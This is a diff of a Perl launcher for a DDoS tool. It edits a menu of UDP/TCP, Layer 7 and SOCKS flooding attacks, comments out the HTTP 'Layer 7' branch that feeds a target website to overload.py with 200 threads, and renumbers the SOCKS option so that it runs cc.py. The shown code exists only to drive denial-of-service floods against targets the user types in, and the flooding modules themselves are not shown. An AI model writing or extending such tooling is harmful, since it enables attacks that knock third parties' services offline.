@@ -46,8 +46,7 @@ STDOUT->flush();
 print q{
     =========================================================
     |   1    |  DDOS UDP & TCP                              |
-    |   2    |  DDOS LAYER 7                                |
-    |   3    |  DDOS SOCK5 & SOCK4                          |
+    |   2    |  DDOS SOCK5 & SOCK4                          |
     =========================================================
 };
 print("\n\n[~]Choose: "); # Set Target IP
@@ -154,30 +153,30 @@ if ($choose == 1) {
        }
     }
     $sock->close()
-}elsif ($choose == 2){
-    print("\n\n[~]Target Website (HTTP): "); # Set Target Web
-    $web = <STDIN>;
-    chomp ($web);
-    while ($web eq ""){
-     print "   [!] IP: ";
-     $web = <STDIN>;
-     chomp ($web);
-    }  
-    print "Target ==> $web\n";
-    print "\n===============================";
-    print "\n[~] Time (500): "; # Set Time
-    $time = <STDIN>;
-    chomp ($time);
-    while ($time eq ""){ 
-     print "   [!] PORT: ";       
-     $time = <STDIN>;
-     chomp ($time); 
-    }
-    print "Time ==> $time\n";
-    print "\n===============================";
-    sleep(1);
+# }elsif ($choose == 2){
+#     print("\n\n[~]Target Website (HTTP): "); # Set Target Web
+#     $web = <STDIN>;
+#     chomp ($web);
+#     while ($web eq ""){
+#      print "   [!] IP: ";
+#      $web = <STDIN>;
+#      chomp ($web);
+#     }  
+#     print "Target ==> $web\n";
+#     print "\n===============================";
+#     print "\n[~] Time (500): "; # Set Time
+#     $time = <STDIN>;
+#     chomp ($time);
+#     while ($time eq ""){ 
+#      print "   [!] PORT: ";       
+#      $time = <STDIN>;
+#      chomp ($time); 
+#     }
+#     print "Time ==> $time\n";
+#     print "\n===============================";
+#     sleep(1);
 
-    system("python ./lib/overload/overload.py --target $web --method HTTP --time $time --thread 200") == 0 or die "Python script returned error $?";
-}elsif ($choose == 3){
+#     system("python ./lib/overload/overload.py --target $web --method HTTP --time $time --thread 200") == 0 or die "Python script returned error $?";
+}elsif ($choose == 2){
     system("python ./lib/cc/cc.py") == 0 or die "Python script returned error $?";
 }
